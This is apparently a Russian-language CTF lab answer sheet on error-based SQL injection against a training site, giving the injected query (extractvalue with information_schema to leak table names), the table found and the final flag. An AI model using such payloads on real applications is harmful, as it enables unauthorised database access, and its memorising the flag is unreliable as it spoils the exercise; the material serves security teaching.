# Уязвимости 4 практика часть 1

**Сайт:** [http://errsql.myctf.ru](http://errsql.myctf.ru)

**Requirements:** ~~Firefox + hackbar plugin~~ WebBrowser

## 2) Получаем список таблиц в текущей базе

`...`

- **Q**: Какой результат вы получили? **A**: `flag`

-
**Q**: Какой запрос вы предположительно получили?

**A**:

```sql
SELECT id FROM users WHERE login = 'admin' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) -- 123 and password = '';
```

- **Q**: Разберите построчно, что именно вы сделали? **A**: выполнили произвольный SQL в строке запроса

## 3) Получаем названия столбцов в найденной таблице

`...`

- **Q**: Какой результат вы получили? **A**: `flag`

## 4) Достаем флаг

`...`

- **Q**: Какой флаг вы получили? **A**: `d0nt_sh0w_y0ur_3rr0r5`
